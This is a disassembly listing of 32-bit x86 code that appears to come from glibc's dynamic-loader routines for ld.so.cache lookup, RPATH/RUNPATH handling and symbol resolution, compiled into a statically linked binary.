mov ebx, edi
lea esi, [ebx + 0x180]
mov dword [var_sp_ch], str.RPATH
mov dword [var_8h], 0xf
mov dword [var_4h], esi
mov dword [esp], ebx
call fcn.0807b6a0
test al, al
jne 0x807d868
mov ebx, dword [ebx + 0x160]
test ebx, ebx
jne 0x807d743
mov ebx, dword [0x80aac58]
test ebx, ebx
je 0x807d7c0
movzx eax, byte [ebx + 0x174]
and eax, 3
cmp al, 2
je 0x807d7c0
cmp ebx, edi
je 0x807d7c0
lea esi, [ebx + 0x180]
mov dword [var_sp_ch], str.RPATH
mov dword [var_8h], 0xf
mov dword [var_4h], esi
mov dword [esp], ebx
call fcn.0807b6a0
test al, al
jne 0x807d850
lea esi, [esi]
lea ecx, [var_ch]
lea ebx, [edi + 0x1d0]
mov dword [var_4h], 0
mov dword [esp], 0x80aa9e0
call fcn.0807d670
mov dword [var_sp_ch], str.RUNPATH
mov dword [var_8h], 0x1d
mov dword [var_4h], ebx
mov dword [esp], edi
call fcn.0807b6a0
test al, al
jne 0x807d83b
test byte [edi + 0x1ed], 8
je 0x807d822
cmp byte [var_15h], 0
je 0x807d81a
mov eax, dword [var_1ch]
mov ecx, dword [eax]
mov edx, dword [eax + 4]
lea edx, [ecx + edx*8 + 8]
mov dword [eax], edx
add esp, 0x20
pop ebx
pop esi
pop edi
leave
ret
lea ecx, [var_ch]
mov dword [var_4h], 0
mov dword [esp], 0x80aa9f4
call fcn.0807d670
jmp 0x807d806
lea ecx, [var_ch]
mov dword [var_4h], 0
mov dword [esp], ebx
call fcn.0807d670
jmp 0x807d7fd
lea ecx, [var_ch]
mov dword [var_4h], 0
mov dword [esp], esi
call fcn.0807d670
jmp 0x807d7c0
lea ecx, [var_ch]
mov dword [var_4h], 0
mov dword [esp], esi
call fcn.0807d670
jmp 0x807d76d
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 8
mov dword [var_10h], edx
movzx ebx, byte [eax]
test bl, bl
je 0x807d971
movzx ecx, byte [edx]
lea esi, [esi]
lea eax, [ebx - 0x30]
cmp al, 9
ja 0x807d952
lea eax, [ecx - 0x30]
mov edx, 1
cmp al, 9
ja 0x807d941
inc edi
movsx eax, bl
inc dword [var_10h]
movzx ebx, byte [edi]
sub eax, 0x30
mov dword [var_14h], eax
movsx eax, cl
lea esi, [eax - 0x30]
lea eax, [ebx - 0x30]
mov edx, ebx
cmp al, 9
ja 0x807d8fd
lea esi, [esi]
mov ecx, dword [var_14h]
inc edi
movsx edx, dl
movzx ebx, byte [edi]
lea eax, [ecx + ecx*4]
lea eax, [edx + eax*2 - 0x30]
mov dword [var_14h], eax
mov edx, ebx
lea eax, [ebx - 0x30]
cmp al, 9
jbe 0x807d8e0
mov eax, dword [var_10h]
movzx ecx, byte [eax]
lea eax, [ecx - 0x30]
mov edx, ecx
cmp al, 9
ja 0x807d92c
lea esi, [esi]
inc dword [var_10h]
lea eax, [esi + esi*4]
movsx edx, dl
lea esi, [edx + eax*2 - 0x30]
mov eax, dword [var_10h]
movzx ecx, byte [eax]
lea eax, [ecx - 0x30]
mov edx, ecx
cmp al, 9
jbe 0x807d910
cmp dword [var_14h], esi
jne 0x807d94b
test bl, bl
jne 0x807d8a0
movsx edx, bl
movsx eax, cl
sub edx, eax
add esp, 8
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [var_14h]
sub edx, esi
jmp 0x807d941
lea eax, [ecx - 0x30]
mov edx, 0xffffffff
cmp al, 9
jbe 0x807d941
cmp bl, cl
jne 0x807d939
inc dword [var_10h]
inc edi
mov eax, dword [var_10h]
movzx ebx, byte [edi]
movzx ecx, byte [eax]
jmp 0x807d931
mov eax, dword [var_10h]
movzx ecx, byte [eax]
jmp 0x807d939
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x4c
test byte [0x80aac10], 1
mov dword [var_10h], eax
jne 0x807de2a
mov ecx, dword [0x80aaa00]
test ecx, ecx
je 0x807dd4d
xor eax, eax
cmp ecx, 0xffffffff
je 0x807dab6
mov edx, dword [0x80aaa04]
mov dword [var_24h], 0
cmp edx, 0xffffffff
mov dword [var_28h], edx
mov ebx, edx
je 0x807dc1a
add ecx, dword [0x80aaa08]
sub ecx, edx
mov dword [var_20h], ecx
mov ecx, dword [0x80aac34]
test ecx, ecx
mov dword [var_34h], ecx
je 0x807da10
xor edi, edi
mov esi, str.i386
lea esi, [esi]
mov eax, dword [var_34h]
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x807dc12
inc edi
add esi, 5
cmp edi, 3
jle 0x807d9f0
mov eax, 0xffffffff
cdq
mov dword [var_30h], eax
mov eax, dword [var_30h]
mov dword [var_2ch], edx
and eax, dword [var_2ch]
inc eax
je 0x807da46
movzx ecx, byte [var_30h]
mov esi, 1
xor edi, edi
xor eax, eax
shld edi, esi, cl
shl esi, cl
and ecx, 0x20
cmovne edi, esi
cmovne esi, eax
mov dword [var_30h], esi
mov dword [var_2ch], edi
mov edx, dword [var_28h]
mov dword [var_14h], 0
mov ecx, dword [edx + 0x14]
dec ecx
cmp dword [var_14h], ecx
mov dword [var_18h], ecx
jg 0x807daaa
lea esi, [esi]
mov eax, dword [var_14h]
add eax, dword [var_18h]
mov edx, eax
shr edx, 0x1f
lea esi, [edx + eax]
sar esi, 1
lea eax, [esi + esi*2]
lea edi, [eax*8]
mov eax, dword [ebx + edi + 0x34]
cmp eax, dword [var_20h]
jae 0x807daaa
mov edx, dword [var_28h]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
je 0x807dae0
jl 0x807dada
dec esi
mov dword [var_18h], esi
mov edx, dword [var_18h]
cmp dword [var_14h], edx
jg 0x807daaa
mov ebx, dword [0x80aaa04]
jmp 0x807da60
test byte [0x80aac10], 1
jne 0x807dabe
mov eax, dword [var_24h]
add esp, 0x4c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_24h]
test eax, eax
je 0x807dab3
mov eax, dword [var_24h]
mov dword [esp], str.__trying_file_s_n
mov dword [var_4h], eax
call fcn.08081c40
jmp 0x807dab3
inc esi
mov dword [var_14h], esi
jmp 0x807da9a
test esi, esi
mov dword [var_14h], esi
jle 0x807db10
mov ebx, dword [0x80aaa04]
mov eax, dword [ebx + edi + 0x1c]
cmp eax, dword [var_20h]
jae 0x807db16
mov edx, dword [var_28h]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
jne 0x807db10
dec esi
sub edi, 0x18
test esi, esi
jg 0x807dae7
nop
mov ebx, dword [0x80aaa04]
cmp esi, dword [var_14h]
lea eax, [esi + esi*2]
lea ebx, [ebx + eax*8]
lea edi, [ebx + 0x30]
jle 0x807db45
mov eax, dword [edi + 4]
cmp eax, dword [var_20h]
jae 0x807daaa
mov edx, dword [var_28h]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
jne 0x807daaa
mov ebx, dword [ebx + 0x30]
cmp ebx, 1
mov dword [var_38h], ebx
je 0x807db60
cmp ebx, 3
je 0x807db60
inc esi
cmp esi, dword [var_18h]
jle 0x807db10
jmp 0x807daaa
mov eax, dword [edi + 8]
mov edx, dword [var_20h]
cmp eax, edx
mov dword [var_3ch], eax
jae 0x807db55
mov ecx, dword [var_24h]
test ecx, ecx
je 0x807db7f
mov ecx, dword [var_38h]
cmp ecx, dword [0x80a95c4]
jne 0x807db55
mov eax, dword [0x80aac6c]
test eax, eax
je 0x807db8d
cmp dword [edi + 0xc], eax
ja 0x807db55
mov edx, dword [var_2ch]
mov eax, dword [var_30h]
not edx
not eax
or edx, eax
je 0x807dc04
mov edx, dword [edi + 0x14]
mov eax, dword [edi + 0x10]
xor ecx, ecx
mov dword [var_40h], edx
mov dword [var_44h], eax
mov ebx, dword [var_40h]
and ebx, 0xf0000
mov edx, ebx
or edx, ecx
je 0x807dbc6
mov edx, dword [var_2ch]
mov eax, dword [var_30h]
xor edx, ebx
xor eax, ecx
or edx, eax
jne 0x807db55
xor edx, edx
mov eax, dword [0x80aa848]
or edx, 0x800f0000
not edx
and edx, dword [var_40h]
not eax
and eax, dword [var_44h]
mov ecx, edx
or ecx, eax
jne 0x807db55
mov edi, dword [var_28h]
mov eax, dword [var_38h]
add edi, dword [var_3ch]
cmp eax, dword [0x80a95c4]
mov dword [var_24h], edi
jne 0x807db55
jmp 0x807daaa
mov eax, dword [edi + 0x10]
mov edx, dword [edi + 0x14]
mov dword [var_44h], eax
mov dword [var_40h], edx
jmp 0x807dbc6
lea eax, [edi + 0x30]
jmp 0x807da15
mov edx, dword [ecx + 0xc]
mov esi, dword [0x80aaa08]
mov dword [var_14h], 0
lea eax, [edx + edx*2]
add esi, ecx
dec edx
lea eax, [ecx + eax*4 + 0x10]
mov dword [var_18h], edx
sub esi, eax
mov dword [var_1ch], eax
cmp dword [var_24h], edx
mov dword [var_20h], esi
jg 0x807daaa
mov eax, dword [var_14h]
add eax, dword [var_18h]
mov edx, eax
shr edx, 0x1f
lea esi, [edx + eax]
sar esi, 1
lea eax, [esi + esi*2]
lea ebx, [eax*4]
mov eax, dword [ecx + ebx + 0x14]
cmp eax, dword [var_20h]
jae 0x807daaa
mov edx, dword [var_1ch]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
je 0x807dca0
jl 0x807dc9a
dec esi
mov dword [var_18h], esi
mov edi, dword [var_18h]
cmp dword [var_14h], edi
jg 0x807daaa
mov ecx, dword [0x80aaa00]
jmp 0x807dc48
inc esi
mov dword [var_14h], esi
jmp 0x807dc86
test esi, esi
mov dword [var_14h], esi
jle 0x807dcd0
mov ecx, dword [0x80aaa00]
mov eax, dword [ecx + ebx + 8]
cmp eax, dword [var_20h]
jae 0x807dcd6
mov edx, dword [var_1ch]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
jne 0x807dcd0
dec esi
sub ebx, 0xc
test esi, esi
jg 0x807dca7
nop
mov ecx, dword [0x80aaa00]
cmp esi, dword [var_14h]
lea eax, [esi + esi*2]
lea ebx, [ecx + eax*4]
lea edi, [ebx + 0x10]
jle 0x807dd05
mov eax, dword [edi + 4]
cmp eax, dword [var_20h]
jae 0x807daaa
mov edx, dword [var_1ch]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
jne 0x807daaa
mov eax, dword [ebx + 0x10]
cmp eax, 1
je 0x807dd1d
cmp eax, 3
je 0x807dd1d
inc esi
cmp esi, dword [var_18h]
jle 0x807dcd0
jmp 0x807daaa
mov ecx, dword [edi + 8]
cmp ecx, dword [var_20h]
jae 0x807dd12
mov edx, dword [var_24h]
test edx, edx
je 0x807dd45
mov edx, dword [0x80a95c4]
cmp eax, edx
jne 0x807dd12
add ecx, dword [var_1ch]
cmp eax, edx
mov dword [var_24h], ecx
jne 0x807dd12
jmp 0x807daaa
mov edx, dword [0x80a95c4]
jmp 0x807dd36
mov ecx, 1
mov edx, 0x80aaa08
mov eax, str._etc_ld.so.cache
call fcn.080817c0
cmp eax, 0xffffffff
mov ebx, eax
je 0x807de1e
mov eax, dword [0x80aaa08]
cmp eax, 0x10
mov dword [var_48h], eax
jbe 0x807dddc
mov edx, str.ld.so_1.7.0
mov eax, 0xb
mov esi, ebx
cld
mov edi, edx
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807dddc
mov eax, dword [ebx + 0xc]
mov dword [0x80aaa00], ebx
lea eax, [eax + eax*2]
lea eax, [eax*4 + 0x10]
lea ebx, [eax + ebx]
add eax, 0x30
cmp dword [var_48h], eax
mov dword [0x80aaa04], ebx
jb 0x807ddc2
mov edi, str.glibc_ld.so.cache1.1
mov ecx, 0x14
mov esi, ebx
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x807ddcc
mov dword [0x80aaa04], 0xffffffff
mov ecx, dword [0x80aaa00]
test ecx, ecx
jne 0x807d9a7
jmp 0x807de43
cmp ebx, 0xffffffff
je 0x807de1e
cmp dword [var_48h], 0x30
jbe 0x807de0a
mov edx, str.glibc_ld.so.cache1.1
mov eax, 0x14
mov esi, ebx
cld
mov edi, edx
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807de0a
mov dword [0x80aaa04], ebx
mov dword [0x80aaa00], ebx
jmp 0x807ddcc
cmp ebx, 0xffffffff
je 0x807de1e
mov eax, dword [var_48h]
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.08054780
mov dword [0x80aaa00], 0xffffffff
jmp 0x807ddcc
mov dword [var_4h], str._etc_ld.so.cache
mov dword [esp], str._search_cache_s_n
call fcn.08081c40
jmp 0x807d999
mov dword [var_ch], str._dl_load_cache_lookup
mov dword [var_8h], 0xeb
mov dword [var_4h], str..._sysdeps_generic_dl_cache.c
mov dword [esp], str.cache_____void__0_
call fcn.0805efc0
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 8
mov edx, dword [0x80aaa00]
test edx, edx
je 0x807dea0
cmp edx, 0xffffffff
je 0x807dea0
mov eax, dword [0x80aaa08]
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08054780
mov dword [0x80aaa00], 0
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
sub esp, 8
mov dword [esp], ebx
mov dword [var_4h], esi
mov edx, dword [arg_8h]
movzx ecx, byte [edx]
test ecx, ecx
je 0x807df2d
mov eax, ecx
movzx ecx, byte [edx + 1]
jecxz 0x807df2d
shl eax, 4
add eax, ecx
movzx ecx, byte [edx + 2]
jecxz 0x807df2d
shl eax, 4
add eax, ecx
movzx ecx, byte [edx + 3]
jecxz 0x807df2d
shl eax, 4
add eax, ecx
movzx ecx, byte [edx + 4]
jecxz 0x807df2d
shl eax, 4
add edx, 5
add eax, ecx
movzx ecx, byte [edx]
jecxz 0x807df2d
shl eax, 4
mov esi, 0xf0000000
inc edx
add eax, ecx
and esi, eax
and eax, 0xfffffff
shr esi, 0x18
movzx ecx, byte [edx]
xor eax, esi
test ecx, ecx
jne 0x807df0f
mov esi, dword [var_4h]
mov ebx, dword [esp]
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
mov edx, dword [arg_20h]
mov eax, dword [arg_18h]
mov ecx, dword [eax]
mov dword [var_10h], edx
mov eax, dword [eax + 4]
mov dword [var_14h], ecx
mov dword [var_18h], eax
lea esi, [esi]
mov edx, dword [var_14h]
mov eax, dword [arg_1ch]
mov dword [var_28h], 0
mov dword [var_2ch], 0
mov edi, dword [edx + eax*4]
mov edx, dword [arg_28h]
test edx, edx
je 0x807df83
cmp edi, dword [var_1ch]
je 0x807df97
test byte [arg_2ch], 2
je 0x807dfae
movzx eax, byte [edi + 0x174]
and eax, 3
test al, al
jne 0x807dfae
inc dword [arg_1ch]
mov eax, dword [var_18h]
cmp dword [arg_1ch], eax
jb 0x807df60
xor edx, edx
add esp, 0x34
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
test byte [0x80aac10], 8
jne 0x807e1fb
mov eax, dword [edi + 0x30]
xor edx, edx
mov eax, dword [eax + 4]
mov dword [var_1ch], eax
mov eax, dword [edi + 0x2c]
mov eax, dword [eax + 4]
mov dword [var_20h], eax
mov eax, dword [edi + 0x18c]
mov dword [var_24h], eax
mov eax, dword [arg_ch]
div dword [edi + 0x164]
mov eax, dword [edi + 0x168]
mov esi, dword [eax + edx*4]
test esi, esi
je 0x807e02b
mov esi, esi
mov ebx, dword [var_1ch]
mov eax, esi
shl eax, 4
add ebx, eax
mov eax, dword [ebx + 4]
test eax, eax
jne 0x807e0ac
movzx eax, byte [ebx + 0xc]
and eax, 0xf
cmp eax, 6
je 0x807e0ac
mov eax, dword [edi + 0x16c]
mov esi, dword [eax + esi*4]
test esi, esi
jne 0x807dff0
cmp dword [var_28h], 1
mov ebx, dword [var_2ch]
je 0x807e02d
xor ebx, ebx
test ebx, ebx
je 0x807e045
movzx eax, byte [ebx + 0xc]
shr al, 4
movzx eax, al
cmp eax, 1
je 0x807e08a
cmp eax, 2
je 0x807e080
test esi, esi
jne 0x807df97
mov eax, dword [var_10h]
test eax, eax
je 0x807df97
mov ecx, dword [var_10h]
mov eax, dword [ecx + 0xc]
test eax, eax
je 0x807df97
mov edx, edi
call fcn.08081cd0
mov edx, 0xffffffff
test eax, eax
je 0x807df97
jmp 0x807dfa4
nop
mov ecx, dword [0x80aac48]
test ecx, ecx
jne 0x807e09c
mov edx, dword [arg_14h]
mov dword [edx], ebx
mov dword [edx + 4], edi
mov edx, 1
jmp 0x807dfa4
mov eax, dword [arg_14h]
mov edx, dword [eax]
test edx, edx
jne 0x807e045
mov dword [eax], ebx
mov dword [eax + 4], edi
jmp 0x807e045
cmp word [ebx + 0xe], 0
jne 0x807e0bd
test byte [var_18h], 1
jne 0x807e015
movzx eax, byte [ebx + 0xc]
and eax, 0xf
cmp eax, 2
jle 0x807e0d2
cmp eax, 6
jne 0x807e015
cmp ebx, dword [arg_10h]
je 0x807e0f3
mov eax, dword [var_20h_2]
mov edx, dword [var_4h]
add eax, dword [ebx]
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.08076e50
test eax, eax
jne 0x807e015
mov eax, dword [var_10h]
test eax, eax
je 0x807e1a6
mov eax, dword [var_24h]
test eax, eax
je 0x807e184
mov edx, dword [var_24h_2]
mov ecx, dword [var_10h_2]
movzx eax, word [edx + esi*2]
mov edx, dword [edi + 0x17c]
and ax, 0x7fff
movzx eax, ax
shl eax, 4
mov dword [var_30h], eax
mov eax, dword [ecx + 4]
mov ecx, dword [var_30h]
cmp dword [edx + ecx + 4], eax
je 0x807e164
mov eax, dword [var_10h_2]
mov eax, dword [eax + 8]
test eax, eax
jne 0x807e015
mov eax, dword [edi + 0x17c]
mov edx, dword [var_30h]
mov eax, dword [eax + edx + 4]
test eax, eax
jne 0x807e015
mov ecx, dword [var_24h_2]
cmp word [ecx + esi*2], 0
js 0x807e015
jmp 0x807e031
mov ecx, dword [var_10h_2]
mov eax, dword [ecx]
mov ecx, dword [var_30h]
mov dword [var_4h], eax
mov eax, dword [edx + ecx]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
jne 0x807e12e
jmp 0x807e031
mov ecx, dword [var_10h]
mov eax, dword [ecx + 0xc]
test eax, eax
je 0x807e031
mov edx, edi
call fcn.08081cd0
test eax, eax
je 0x807e031
jmp 0x807e226
mov eax, dword [var_24h]
test eax, eax
je 0x807e031
test byte [arg_24h], 2
je 0x807e1e8
mov eax, dword [var_24h]
movzx edx, word [eax + esi*2]
mov eax, edx
and eax, 0x7fff
dec eax
jle 0x807e031
test dx, dx
js 0x807e015
inc dword [var_28h]
cmp dword [var_28h], 1
cmovne ebx, dword [var_2ch]
mov dword [var_2ch], ebx
jmp 0x807e015
mov ecx, dword [var_24h]
movzx edx, word [ecx + esi*2]
mov eax, edx
and eax, 0x7fff
cmp eax, 2
jmp 0x807e1c6
mov eax, dword [edi + 4]
cmp byte [eax], 0
jne 0x807e20a
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov ecx, dword [var_4h]
mov dword [var_8h], eax
mov dword [esp], str.symbol_s___lookup_in_file_s_n
mov dword [var_4h], ecx
call fcn.08081c40
jmp 0x807dfbb
mov dword [var_ch], str.do_lookup_x
mov dword [var_8h], 0x6d
mov dword [var_4h], str.do_lookup.h
mov dword [esp], str.version__filename____void__0______dl_name_match_p__version__filename__map_
call fcn.0805efc0
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_bp_8h], esi
mov dword [var_bp_ch], ebx
mov dword [var_bp_4h], edi
mov esi, eax
mov ebx, edx
mov dword [var_10h_2], 0
xor eax, eax
cmp esi, edx
je 0x807e2bf
mov eax, 0
test eax, eax
je 0x807e285
mov dword [esp], 0x80a95d4
call section.
mov eax, dword [esi + 0x170]
test eax, eax
jne 0x807e299
mov eax, dword [ebx + 0x170]
test eax, eax
je 0x807e2a7
movzx eax, byte [ebx + 0x174]
and eax, 3
cmp al, 2
je 0x807e2ca
mov eax, 0
test eax, eax
je 0x807e2bc
mov dword [esp], 0x80a95d4
call section.
mov eax, dword [var_10h_2]
mov ebx, dword [var_bp_ch]
mov esi, dword [var_bp_8h]
mov edi, dword [var_bp_4h]
leave
ret
mov edx, dword [ebx + 0x1ec]
test dl, 8
jne 0x807e2a7
movzx eax, byte [esi + 0x174]
and eax, 3
cmp al, 2
je 0x807e2f4
inc dword [ebx + 0x170]
or edx, 8
mov dword [ebx + 0x1ec], edx
jmp 0x807e2a7
test byte [esi + 0x1ec], 8
jne 0x807e2e3
mov edi, dword [esi + 0x150]
test edi, edi
je 0x807e321
mov ecx, dword [esi + 0x1d8]
xor edx, edx
mov eax, dword [ecx]
test eax, eax
je 0x807e321
cmp eax, ebx
je 0x807e2a7
inc edx
mov eax, dword [ecx + edx*4]
test eax, eax
jne 0x807e315
mov edi, dword [esi + 0x1e0]
xor edx, edx
mov ecx, dword [esi + 0x1e4]
cmp edx, edi
jae 0x807e341
cmp dword [ecx + edx*4], ebx
je 0x807e2a7
inc edx
cmp edx, edi
jb 0x807e333
mov eax, dword [0x80aac58]
test eax, eax
je 0x807e444
cmp eax, ebx
je 0x807e361
mov eax, dword [eax + 0xc]
test eax, eax
je 0x807e444
cmp eax, ebx
jne 0x807e352
test eax, eax
je 0x807e444
mov eax, dword [esi + 0x1dc]
cmp edi, eax
jae 0x807e3fe
mov eax, dword [esi + 0x1e0]
mov edx, dword [esi + 0x1e4]
mov dword [edx + eax*4], ebx
inc eax
mov dword [esi + 0x1e0], eax
mov ecx, dword [ebx + 0x150]
test ecx, ecx
je 0x807e3e1
inc dword [ebx + 0x170]
test byte [0x80aac10], 0x40
je 0x807e2a7
mov eax, dword [esi + 4]
cmp byte [eax], 0
jne 0x807e3b9
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h_2], eax
mov eax, dword [ebx + 4]
cmp byte [eax], 0
jne 0x807e3cc
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_4h_2], eax
mov dword [esp], str._nfile_s___needed_by__s__relocation_dependency__n_n
call fcn.08081c40
jmp 0x807e2a7
mov ecx, dword [ebx + 0x1d8]
mov eax, dword [ecx]
test eax, eax
je 0x807e39d
add ecx, 4
inc dword [eax + 0x170]
mov eax, dword [ecx]
test eax, eax
jne 0x807e3ed
jmp 0x807e39d
add eax, 5
mov dword [esp], ecx
mov dword [esi + 0x1dc], eax
shl eax, 2
mov dword [var_4h_2], eax
call fcn.08051220
test eax, eax
je 0x807e433
mov dword [esi + 0x1e4], eax
mov eax, dword [esi + 0x1dc]
cmp edi, eax
jb 0x807e377
jmp 0x807e38d
mov eax, dword [esi + 0x1dc]
sub eax, 5
mov dword [esi + 0x1dc], eax
jmp 0x807e426
mov dword [var_10h_2], 0xffffffff
jmp 0x807e2a7
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0x84
mov dword [var_54h], ecx
mov dword [var_50h], edx
mov dword [esp], eax
call fcn.0807dec0
mov ebx, dword [arg_8h]
mov dword [var_58h], eax
mov dword [var_44h], 0
mov dword [var_40h], 0
mov eax, dword [arg_ch]
test eax, eax
jne 0x807e8e6
mov eax, dword [arg_18h]
xor esi, esi
test eax, eax
jne 0x807e89a
mov ecx, dword [arg_8h]
mov edx, dword [ecx]
test edx, edx
mov eax, esi
je 0x807e4ff
mov edx, dword [arg_10h]
mov ecx, dword [arg_18h]
mov dword [var_14h], eax
mov dword [var_24h], edx
mov dword [var_20h], ecx
mov edx, dword [arg_14h]
mov ecx, dword [arg_ch]
mov dword [var_1ch], edx
mov edx, dword [var_54h]
mov dword [var_18h], ecx
mov ecx, dword [var_58h]
mov eax, dword [ebx]
mov dword [var_10h], eax
lea eax, [var_44h]
mov dword [var_sp_ch], eax
mov eax, dword [edx]
mov dword [esp], edi
mov dword [var_4h], ecx
mov dword [var_8h], eax
call fcn.0807df40
test eax, eax
mov ecx, eax
jg 0x807e4ff
jl 0x807e785
add ebx, 4
xor eax, eax
mov edx, dword [ebx]
test edx, edx
jne 0x807e4a3
mov ebx, dword [var_44h]
test ebx, ebx
je 0x807e696
mov ecx, dword [var_54h]
mov dword [var_64h], 0
mov edx, dword [ecx]
test edx, edx
je 0x807e52a
movzx eax, byte [edx + 0xd]
and eax, 3
cmp eax, 3
je 0x807e5d9
mov edx, dword [var_40h]
movzx eax, byte [edx + 0x174]
and eax, 3
cmp al, 2
je 0x807e590
test dword [0x80aac10], 0x204
jne 0x807e55c
mov eax, dword [var_44h]
mov edx, dword [var_54h]
mov dword [edx], eax
mov eax, dword [var_40h]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 0x14
mov ecx, dword [var_64h]
mov eax, dword [arg_10h]
mov edx, dword [arg_ch]
mov dword [var_10h], ecx
mov dword [var_sp_ch], eax
lea ecx, [var_44h]
mov eax, dword [arg_8h]
mov dword [var_8h], edx
mov dword [var_4h], ecx
mov edx, dword [var_50h]
mov ecx, dword [var_54h]
mov dword [esp], eax
mov eax, edi
call fcn.0807e950
sub esp, 0x14
jmp 0x807e547
test byte [arg_14h], 1
je 0x807e53b
mov eax, dword [var_50h]
call fcn.0807e250
test eax, eax
jns 0x807e53b
mov edx, dword [arg_14h]
mov eax, dword [arg_18h]
mov ecx, dword [arg_10h]
mov dword [var_sp_ch], edx
mov dword [var_10h], eax
mov edx, dword [arg_8h]
mov eax, dword [arg_ch]
mov dword [var_8h], ecx
mov ecx, dword [var_54h]
mov dword [esp], edx
mov edx, dword [var_50h]
mov dword [var_4h], eax
mov eax, edi
call fcn.0807e450
sub esp, 0x14
jmp 0x807e552
cmp dword [arg_10h], 1
mov dword [var_64h], 1
je 0x807e67f
mov ebx, dword [arg_8h]
mov dword [var_4ch], 0
mov dword [var_48h], 0
mov eax, dword [ebx]
test eax, eax
je 0x807e658
mov eax, dword [arg_18h]
mov ecx, dword [arg_14h]
mov dword [var_24h], 1
mov dword [var_14h], esi
mov dword [var_20h], eax
mov dword [var_1ch], ecx
mov eax, dword [arg_ch]
lea ecx, [var_4ch]
mov dword [var_18h], eax
mov eax, dword [ebx]
mov dword [esp], edi
mov dword [var_sp_ch], ecx
mov dword [var_8h], edx
mov dword [var_10h], eax
mov eax, dword [var_58h]
mov dword [var_4h], eax
call fcn.0807df40
test eax, eax
jne 0x807e658
add ebx, 4
xor esi, esi
mov eax, dword [ebx]
test eax, eax
je 0x807e658
mov ecx, dword [var_54h]
mov edx, dword [ecx]
jmp 0x807e601
mov eax, dword [var_4ch]
test eax, eax
je 0x807e52a
mov edx, dword [var_50h]
cmp dword [var_48h], edx
je 0x807e52a
mov ecx, dword [var_54h]
mov dword [var_40h], edx
mov eax, dword [ecx]
mov dword [var_44h], eax
jmp 0x807e52a
mov eax, dword [var_50h]
cmp dword [var_40h], eax
je 0x807e52a
mov dword [var_44h], edx
mov dword [var_40h], eax
jmp 0x807e52a
mov edx, dword [var_54h]
mov eax, dword [edx]
test eax, eax
je 0x807e6aa
movzx eax, byte [eax + 0xc]
shr al, 4
cmp al, 2
je 0x807e6b1
mov ecx, dword [arg_18h]
test ecx, ecx
je 0x807e6c1
mov edx, dword [var_54h]
mov dword [edx], 0
xor eax, eax
jmp 0x807e552
mov edx, dword [var_50h]
mov dword [var_60h], 0x80a4f11
test edx, edx
je 0x807e6d8
mov ecx, dword [var_50h]
mov ecx, dword [ecx + 4]
mov dword [var_60h], ecx
mov eax, dword [arg_ch]
mov edx, str.__version_
test eax, eax
mov eax, 0x80a4f11
cmove edx, eax
je 0x807e6f5
mov ecx, dword [arg_ch]
mov eax, dword [ecx]
test eax, eax
jne 0x807e6fa
mov eax, 0x80a4f11
mov dword [var_3ch], str.undefined_symbol:_
mov dword [var_38h], edi
mov dword [var_34h], edx
mov dword [var_30h], eax
mov esi, 1
xor ebx, ebx
mov eax, dword [ebp + ebx*4 - 0x3c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 3
jbe 0x807e711
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_37h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x3c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 3
mov edx, eax
jbe 0x807e738
mov eax, dword [var_60h]
cmp byte [eax], 0
jne 0x807e780
mov eax, dword [0x80a95a8]
mov edx, str._main_program_
mov eax, dword [eax]
test eax, eax
cmovne edx, eax
mov ecx, str.symbol_lookup_error
xor eax, eax
mov dword [esp], esi
call fcn.08081380
sub esp, 4
jmp 0x807e6b1
mov edx, dword [var_60h]
jmp 0x807e769
mov eax, dword [arg_18h]
test eax, eax
jne 0x807e4f4
mov esi, dword [arg_ch]
test esi, esi
je 0x807e876
mov ebx, dword [var_50h]
mov dword [var_5ch], 0
test ebx, ebx
je 0x807e7b2
mov eax, dword [var_50h]
mov eax, dword [eax + 4]
mov dword [var_5ch], eax
mov edx, dword [arg_ch]
mov dword [var_2ch], str.symbol_
mov dword [var_28h], edi
mov dword [var_bp_24h], str.__version_
cmp ecx, 0xfffffffe
mov esi, 1
mov eax, dword [edx]
mov dword [var_bp_1ch], str._not_defined_in_file_
mov dword [var_bp_20h], eax
mov eax, dword [edx + 0xc]
mov edx, str.__no_version_symbols_
mov dword [var_bp_14h], str._with_link_time_reference
mov dword [var_bp_18h], eax
mov eax, 0x80a4f11
